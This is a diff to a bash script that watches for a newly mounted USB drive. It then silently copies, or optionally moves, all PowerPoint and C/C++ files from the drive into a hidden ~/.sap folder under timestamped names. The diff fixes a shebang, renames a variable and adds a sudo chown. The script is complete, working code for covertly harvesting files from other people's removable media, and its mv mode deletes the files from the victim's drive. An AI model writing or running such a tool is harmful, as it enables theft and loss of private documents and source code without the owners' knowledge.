@@ -1,10 +1,13 @@
-#/bin/bash
+#!/bin/bash
 
 #cp for copy; mv for move;
 SLAY_LEVEL=cp
 
 #files you want to slay
-EXTENTIONS=("ppt" "pptx" "c" "cpp")
+EXTENSIONS="ppt pptx c cpp"
+
+ME=$USER
+sudo chown $ME ~/.sap
 
 mount | grep /media/ | awk '{print$3}' > .before
 while [ "$USB" = "" ]; do
@@ -17,15 +20,15 @@ rm .before .present
 SOURCE_PATH=$USB
 TARGET_PATH=~/.sap
 
-for EXTENTION in ${EXTENTIONS[@]}; do
-	find $SOURCE_PATH -name "*.$EXTENTION" > .FILES.txt
+for EXTENSION in $EXTENSIONS; do
+	find $SOURCE_PATH -name "*.$EXTENSION" > .FILES.txt
 
 	NUMBER_OF_FILES=$(grep -c "" .FILES.txt)
 	for i in `seq 1 $NUMBER_OF_FILES`; do
         	FILE=$(sed -n "$i p" .FILES.txt)
 		date=$(date)
 		NEW=${date:4:3}-${date:8:2}-${date:11:2}-${date:14:2}-${date:17:2}-$i
-        	$SLAY_LEVEL "$FILE" "$TARGET_PATH/$NEW.$EXTENTION"
+        	$SLAY_LEVEL "$FILE" "$TARGET_PATH/$NEW.$EXTENSION"
 	done
 done
 rm .FILES.txt
